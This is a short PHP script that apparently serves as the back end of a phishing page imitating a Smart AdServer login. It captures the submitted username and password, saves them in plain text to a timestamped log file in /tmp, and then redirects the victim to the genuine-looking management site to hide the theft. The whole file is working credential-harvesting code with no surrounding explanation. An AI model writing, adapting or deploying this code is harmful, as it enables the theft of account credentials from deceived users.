<?php

$login=$_POST['login'];
$password=$_POST['pwd'];

$f=fopen('/tmp/smart-' . date('Y-m-d-H-i-s') . '.log', 'w+');
fputs($f, 'login=' . $login . ' -- password=' . $password . "\n");
fclose($f);

header("Location: http://manage-v40.smartadserver.com");
@ob_flush();
?>